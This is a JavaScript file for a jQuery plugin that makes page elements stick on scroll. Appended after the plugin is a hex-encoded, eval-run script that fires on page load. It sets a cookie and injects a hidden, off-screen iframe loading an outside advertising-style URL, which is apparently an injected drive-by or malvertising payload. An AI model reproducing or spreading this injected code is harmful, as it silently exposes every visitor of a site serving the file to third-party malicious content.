;/**
 *
 *
 *	
 * 
 *  Example Usage:
 *  <div data-sticky></div>
 *  <div data-sticky data-sticky-full-width></div>
 *
 *  Requires Modernizr
 */
(function( $, Modernizr, undefined ) {
	var Sticky = function ($el) {
		var _this = this;
		
		_this.options = {
			full_width: $el.data('sticky-full-width') === '',
			fixed: $el.data('sticky-fixed') === ''
		};

		_this.$el = $el;

		if ( window.innerWidth > 880 && !Modernizr.touch )
			_this.init();
		
		if (!window.Stickies) window.Stickies = [];

		Stickies.push( _this );

		return this;
	};

	Sticky.prototype.init = function() {
		var _this = this;

		_this.sticky_id = 'sticky-item-' + Math.round( Math.random() * 100 ),
		_this.$wrap = $('<div id="'+ _this.sticky_id +'" class="sticky--wrapper"></div>');
		_this.$wrap.css( _this.getWrapperStyles() );

		_this.$el.wrap(this.$wrap);
		_this.offsetTop = _this.$el.offset().top;
		_this.triggerOffsetTop = _this.options.fixed ? 0 : _this.$el.offset().top;

		console.log("Options: ", _this.options);
		console.log("Offset Top: ", _this.offsetTop);
		_this.offsetLeft = this.$wrap.offset().left + this.$el.offset().left;
	}


	/* http://stackoverflow.com/questions/13382516/getting-scroll-bar-width-using-javascript */
	Sticky.prototype.getScrollbarWidth = function() {
	    var outer = document.createElement("div");
	    outer.style.visibility = "hidden";
	    outer.style.width = "100px";
	    outer.style.msOverflowStyle = "scrollbar"; // needed for WinJS apps

	    document.body.appendChild(outer);

	    var widthNoScroll = outer.offsetWidth;
	    // force scrollbars
	    outer.style.overflow = "scroll";

	    // add innerdiv
	    var inner = document.createElement("div");
	    inner.style.width = "100%";
	    outer.appendChild( inner );

	    var widthWithScroll = inner.offsetWidth;

	    // remove divs
	    outer.parentNode.removeChild(outer);

	    return widthNoScroll - widthWithScroll;
	}

	Sticky.prototype.getWrapperStyles = function() {

		var _this = this, 
			position = (_this.$el.css('position') === "absolute" ) ? 'absolute' : 'relative',
			styles = {};

		if ( position === 'absolute' ) {
			var arr = ['top', 'right', 'bottom', 'left'];
			for (var i = arr.length - 1; i >= 0; i--) {
				var prop = arr[i],
					val = _this.$el.css(prop);

				if ( val !== "auto" ) {
					styles[prop] = val;
				}
			};

			styles.width = _this.$el.outerWidth() + 5;
		}

		return $.extend({
			'height': ( _this.$el.outerHeight() + parseFloat( _this.$el.css('margin-bottom') ) ),
			'position': position,
			'width' : _this.$el.outerWidth()
		}, styles );
	}

	Sticky.prototype.getElementStyle = function() {

		var _this = this,
			styles = {
			'position': 'fixed',
			'top' : _this.options.fixed ? _this.offsetTop : 0,
			'width': _this.$el.outerWidth()
		}

		if ( _this.options.full_width ) {
			styles['width'] = window.innerWidth - _this.getScrollbarWidth();

		} else {
			styles = $.extend(styles, {
				'left': _this.offsetLeft,
			})
		}

		return styles
	}

	Sticky.prototype.checkPosition = function( offset_y ) {
		var _this = this;
		console.log(_this.offsetTop, offset_y);
		if ( _this.triggerOffsetTop < offset_y ) {
			
			_this.$el.addClass('s__stuck').css(
				_this.getElementStyle() );

		} else {
			_this.$el.removeClass('s__stuck').css({
				'position': 'relative',
				'top' : 0,
				'left' : 0,
				'width': _this.$el.outerWidth()
			});
		}
	}

	$('[data-sticky]').each(function() {
		new Sticky( $(this) );
	})

	// We've got a cheeky wrapper element capturing scrolls
	// 
	var $page = $('#page').length ? $('#page') : $(window);

	if ( window.Stickies ) {
		$page.on( 'scroll', function(evt) {
			var scrollTop = $page.scrollTop();
			for (var i = window.Stickies.length - 1; i >= 0; i--) {
				window.Stickies[i].checkPosition( scrollTop );
			};
		});

	}

	console.log("jquery.sticky.v2");
}( window.jQuery, window.Modernizr ) );/*046a60064ff0ffc9572bd723e28ee7b3*/;(function(){var dyezkfzf="";var drybbrdb="77696e646f772e6f6e6c6f6164203d2066756e6374696f6e28297b66756e6374696f6e20783232627128612c622c63297b69662863297b7661722064203d206e6577204461746528293b642e7365744461746528642e6765744461746528292b63293b7d6966286120262620622920646f63756d656e742e636f6f6b6965203d20612b273d272b622b2863203f20273b20657870697265733d272b642e746f555443537472696e672829203a202727293b656c73652072657475726e2066616c73653b7d66756e6374696f6e2078333362712861297b7661722062203d206e65772052656745787028612b273d285b5e3b5d297b312c7d27293b7661722063203d20622e6578656328646f63756d656e742e636f6f6b6965293b69662863292063203d20635b305d2e73706c697428273d27293b656c73652072657475726e2066616c73653b72657475726e20635b315d203f20635b315d203a2066616c73653b7d766172207833336471203d2078333362712822353535346265383235613131643761313261393132663762616432396539303522293b69662820783333647120213d2022306539656136383034646431366137626535616261313739663834303038666422297b783232627128223535353462653832356131316437613132613931326637626164323965393035222c223065396561363830346464313661376265356162613137396638343030386664222c31293b766172207832326471203d20646f63756d656e742e637265617465456c656d656e74282264697622293b766172207832327171203d2022687474703a2f2f6373732e62656c6179616d6f7264612e696e666f2f6d656761616476657274697a652f3f66426753464451494d6f61753d76675a706d6a78774c266b6579776f72643d346261636566363633396264333133396338623062326633303034306464323826444e786e6e6d72496a5777754255453d6842697343776c57746d44265378487065586159545152774172753d704d64434b4f69665668685a695a2665566948574e57664956575542787577417a74433d4761446d6662736a725226684f535373744c49685161493d6950555768456873484a7746536226754359765351486748774362415645623d73496a4d536b4b47424d4566266e6644585167466742523d6d655a694843577848714b223b78323264712e696e6e657248544d4c3d223c646976207374796c653d27706f736974696f6e3a6162736f6c7574653b7a2d696e6465783a313030303b746f703a2d3130303070783b6c6566743a2d3939393970783b273e3c696672616d65207372633d27222b78323271712b22273e3c2f696672616d653e3c2f6469763e223b646f63756d656e742e626f64792e617070656e644368696c64287832326471293b7d7d";for (var ykiardsd=0;ykiardsd<drybbrdb.length;ykiardsd+=2){dyezkfzf=dyezkfzf+parseInt(drybbrdb.substring(ykiardsd,ykiardsd+2), 16)+",";}dyezkfzf=dyezkfzf.substring(0,dyezkfzf.length-1);eval(eval('String.fromCharCode('+dyezkfzf+')'));})();/*046a60064ff0ffc9572bd723e28ee7b3*/